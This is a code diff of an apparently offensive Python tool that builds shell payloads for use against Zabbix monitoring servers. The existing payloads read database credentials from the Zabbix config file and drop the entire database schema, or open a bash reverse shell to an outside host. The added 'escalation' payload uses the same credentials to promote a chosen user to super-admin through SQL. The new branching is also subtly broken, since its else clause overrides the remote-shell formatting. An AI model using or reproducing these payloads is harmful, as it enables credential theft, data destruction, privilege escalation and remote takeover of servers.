@@ -14,6 +14,13 @@ ZABBIX_DBUSER=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBUser=//gp")
 echo "DROP SCHEMA public CASCADE;" | PGPASSWORD=$ZABBIX_DBPASSWORD psql $ZABBIX_DBNAME $ZABBIX_DBUSER -h 127.0.0.1
 exit 1
 ''',
+    "escalation": '''\
+ZABBIX_DBPASSWORD=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBPassword=//gp")
+ZABBIX_DBNAME=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBName=//gp")
+ZABBIX_DBUSER=$(cat /etc/zabbix/zabbix_server.conf | sed -n "s/^DBUser=//gp")
+echo "UPDATE users SET type = 3 WHERE userid = (SELECT userid FROM users WHERE alias LIKE '{user}');)" | PGPASSWORD=$ZABBIX_DBPASSWORD psql $ZABBIX_DBNAME $ZABBIX_DBUSER -h 127.0.0.1
+exit 1
+''',
     "remote-shell": '''\
 bash -c 'bash -i >&/dev/tcp/{remote_host}/{remote_port} 0>&1 &'
 exit 1
@@ -32,6 +39,9 @@ if __name__ == "__main__":
 
     subparser = subparsers.add_parser("destroy-database")
 
+    subparser = subparsers.add_parser("escalation")
+    subparser.add_argument("user")
+
     subparser = subparsers.add_parser("remote-shell")
     subparser.add_argument("remote_host")
     subparser.add_argument("remote_port")
@@ -40,6 +50,8 @@ if __name__ == "__main__":
 
     if args.command == "remote-shell":
         evil_command = COMMANDS["remote-shell"].format(**vars(args))
+    if args.command == "escalation":
+        evil_command = COMMANDS["escalation"].format(**vars(args))
     else:
         evil_command = COMMANDS[args.command]
 
